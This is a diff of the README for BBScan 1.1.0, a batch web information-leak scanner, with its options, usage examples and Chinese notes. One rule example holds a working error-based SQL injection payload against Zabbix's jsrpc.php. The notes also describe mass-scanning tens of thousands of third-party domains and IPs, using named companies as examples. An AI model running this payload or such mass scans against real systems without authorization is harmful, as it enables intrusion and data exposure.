@@ -1,72 +1,95 @@
-# BBScan #
+# BBScan 1.1.0 #
 
 **BBScan** is a tiny **B**atch we**B** vulnerability **Scan**ner.
 
-## Feathers ##
-
-* It has a quite small but efficient set of rules
-* It can auto add **Target/mask** network hosts to scanner
-* Quite few false positives
 
 ## Requirements ##
-* Python 2.7.x
 * BeautifulSoup4==4.3.2
 * py2-ipaddress==3.4.1
 
-with pip installed, you can install required packages
+You can install required packages with pip
 
-> pip install -r requirements.txt
+	pip install -r requirements.txt
 
 ## Usage ##
 
 	usage: BBScan.py [options]
-
-	* A tiny Batch weB vulnerability Scanner. By LiJieJie *
-
+	
+	* A tiny Batch weB vulnerability Scanner. *
+	By LiJieJie (http://www.lijiejie.com)
+	
 	optional arguments:
-	  -h, --help          show this help message and exit
-	  --host HOST         Scan a single host
-	  -f TargetFile       Load targets from TargetFile
-	  -d TargetDirectory  Load all *.txt files from TargetDirectory
-	  -p PROCESS          Num of processes running concurrently, 10 by default
-	  -t THREADS          Num of scan threads for each scan process, 20 by default
-	  --network MASK      Scan all Target/mask hosts, 
-			      		  should be a int between 24 and 31.
-	  --timeout Timeout   Max scan minutes for each website, 20 by default
-	  --browser           Open web browser to view report after scan was finished.
-	  -v                  show program's version number and exit
+	  -h, --help            show this help message and exit
+	  --host HOST [HOST2 HOST3 ...]
+	                        Scan several hosts from command line
+	  -f TargetFile         Load targets from TargetFile
+	  -d TargetDirectory    Load all *.txt files from TargetDirectory
+	  --crawler TargetDirectory
+	                        Load all *.log crawler file from TargetDirectory
+	  --full-scan           Process all sub directories.
+	  -n, --no-crawl        No crawling, sub folders will not be processed.
+	  -nn, --no-check404    No HTTP 404 existence check
+	  -p PROCESS            Num of processes running concurrently, 10 by default
+	  -t THREADS            Num of scan threads for each scan process, 8 by default
+	  --network MASK        Scan all Target/MASK hosts,
+	                        should be an int between 24 and 31
+	  --timeout Timeout     Max scan minutes for each website, 20 by default
+	  --browser             View report with browser after scan finished.
+	  -v                    show program's version number and exit
 
-**1. Scan a single host www.target.com** 
+**1. Scan several hosts from command line** 
 
-	python BBScan.py  --host www.target.com --browser
+	python BBScan.py  --host www.a.com www.b.com --browser
 
-**2. Scan www.target.com and all the other ips in www.target.com/28 networks**
+**2. Scan www.target.com and all the other IPs under www.target.com/28**
 
 	python BBScan.py  --host www.target.com --network 28 --browser
 	
-**3. Load some targets from file**
+**3. Load newline delimetered targets from file and scan**
 	
 	python BBScan.py -f wandoujia.com.txt
 
-**4. Load all targets from Directory**
+**4. Load all targets from Directory(\*.txt file only) and scan**
 
 	python BBScan.py -d targets/
 
 
-## 说明 ##
+## 使用说明 ##
 
-	这是一个迷你的批量信息泄漏扫描脚本。规则字典非常小，但是尽量保证准确和可利用。
-
-	--network 参数用于设置子网掩码，小公司设为28~30，中等规模公司设置26~28，大公司设为24~26
-
-	当然，尽量避免设为24，扫描过于耗时，除非是想在各SRC多刷几个漏洞。
-
-	该插件是从内部扫描器中抽离出来的，感谢 Jekkay Hu<34538980[at]qq.com> 
+BBScan是一个迷你的信息泄漏批量扫描脚本。 可以通过文本批量导入主机或URL，以换行符分割。
 	
-	如果你有非常有用的规则，请找几个网站验证测试后，再 pull request
-	
-脚本还会优化，接下来的事:
+`--crawler` 参数是v1.1新增的，可以导入爬虫日志发起扫描。 日志的格式，我们约定如下：
 
-- 增加有用规则，将规则更好地分类，细化
-- 后续可以直接从 rules\request 文件夹中导入HTTP_request
-- 优化扫描逻辑
+			Request Line + 三个尖括号 + [POST请求body] + 三个尖括号 + HTTP状态码
+示例如下：
+
+			. GET http://www.iqiyi.com/ HTTP/1.1^^^200
+			. POST http://www.pps.tv/login.php HTTP/1.1^^^user=admin&passwd=admin^^^200
+
+`--full-scan`  处理所有的子文件夹，比如 `http://www.target.com/aa/bb/cc/`, `/aa/bb/cc/` `/aa/bb/` `/aa/` 三个path都将被扫描
+
+`-n, --no-crawl`  不从首页抓取新的URL
+
+`-nn, --no-check404` 参数指示不检查状态码404是否存在，不保存404页面的大小进行后续比对
+
+
+## web漏洞应急中的简单应用 ##
+
+以Zabbix SQL注入为例，在一个txt文件中写入规则：
+
+	/zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim%20estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi%20story.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20user())x%20from%20information_schema.character_sets%20group%20by%20x)y)&updateProfil%20e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=%2017&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&%20mark_color=1    {tag="Duplicate entry"}  {status=200}  {type="text/plain"}
+	
+	/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&stamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim%20estamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi%20story.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20user())x%20from%20information_schema.character_sets%20group%20by%20x)y)&updateProfil%20e=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=%2017&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&%20mark_color=1          {tag="Duplicate entry"}  {status=200}  {type="text/plain"}
+
+把所有HTTP like的服务写入 iqiyi.http.txt：
+
+	不要抓首页
+	不要检测404
+	并发2个线程、 50个进程
+
+很快就可以扫完几万个域名和IP地址。
+
+	BBScan.py --no-crawl --no-check404 -t2 -p50 -f iqiyi.http.txt
+
+
+该插件是从内部扫描器中抽离出来的，感谢 `Jekkay Hu<34538980[at]qq.com>` ，欢迎提交有用的新规则	
